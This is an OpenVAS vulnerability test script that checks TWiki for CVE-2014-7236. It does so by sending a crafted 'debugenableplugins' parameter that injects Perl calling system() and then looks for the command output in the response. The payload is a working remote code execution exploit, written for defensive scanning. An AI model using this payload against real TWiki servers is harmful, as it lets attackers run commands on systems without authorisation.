###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_twiki_70372.nasl 12952 2019-01-07 06:54:36Z ckuersteiner $
#
# TWiki 'debugenableplugins' Parameter Remote Code Execution Vulnerability
#
# Authors:
# Michael Meyer <michael.meyer@greenbone.net>
#
# Copyright:
# Copyright (c) 2014 Greenbone Networks GmbH
#
# This program is free software; you can redistribute it and/or
# modify it under the terms of the GNU General Public License
# as published by the Free Software Foundation; either version 2
# of the License, or (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

CPE = "cpe:/a:twiki:twiki";

if (description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.105097");
  script_bugtraq_id(70372);
  script_cve_id("CVE-2014-7236");
  script_tag(name:"cvss_base", value:"6.4");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:N");
  script_version("$Revision: 12952 $");

  script_name("TWiki 'debugenableplugins' Parameter Remote Code Execution Vulnerability");

  script_tag(name:"last_modification", value:"$Date: 2019-01-07 07:54:36 +0100 (Mon, 07 Jan 2019) $");
  script_tag(name:"creation_date", value:"2014-10-27 12:57:24 +0100 (Mon, 27 Oct 2014)");
  script_category(ACT_ATTACK);
  script_family("Web application abuses");
  script_copyright("This script is Copyright (C) 2014 Greenbone Networks GmbH");
  script_dependencies("gb_twiki_detect.nasl", "os_detection.nasl");
  script_require_ports("Services/www", 80);
  script_mandatory_keys("twiki/detected");

  script_xref(name:"URL", value:"http://www.securityfocus.com/bid/70372");
  script_xref(name:"URL", value:"http://twiki.org/");

  script_tag(name:"impact", value:"Attackers can exploit this issue
 to execute arbitrary code in the context of the webserver user.");

  script_tag(name:"vuldetect", value:"Send a HTTP GET request and check the response.");

  script_tag(name:"insight", value:"It is possible to execute arbitrary Perl code by adding a
'debugenableplugins=' parameter with a specially crafted value.");

  script_tag(name:"solution", value:"Updates are available.");
  script_tag(name:"summary", value:"TWiki is prone to remote code-execution vulnerability.");

  script_tag(name:"affected", value:"TWiki 6.0.0, 5.1.0-5.1.4, 5.0.0-5.0.2, 4.3.0-4.3.2, 4.2.0-4.2.4, 4.1.0-4.1.2,
4.0.0-4.0.5.");

  script_tag(name:"solution_type", value:"VendorFix");
  script_tag(name:"qod_type", value:"remote_app");

  exit(0);
}

include("misc_func.inc");
include("http_func.inc");
include("host_details.inc");
include("http_keepalive.inc");

if( ! port = get_app_port( cpe:CPE ) ) exit( 0 );
if( ! dir = get_app_location( cpe:CPE, port:port ) ) dir = '';

cmds = exploit_commands();

foreach cmd ( keys( cmds ) ) {
  ex = '?debugenableplugins=BackupRestorePlugin%3bprint("Content-Type:text/html\\r\\n\\r\\n")%3bprint(system("' +
       cmds[ cmd ]  + '"))%3bexit';
  url = dir + '/view/Main/WebHome' + ex;

  if( http_vuln_check( port:port, url:url, pattern:cmd, check_header:TRUE ) ) {
    report = report_vuln_url( port:port, url:url );
    security_message( port:port, data:report );
    exit( 0 );
  }
}

exit( 99 );
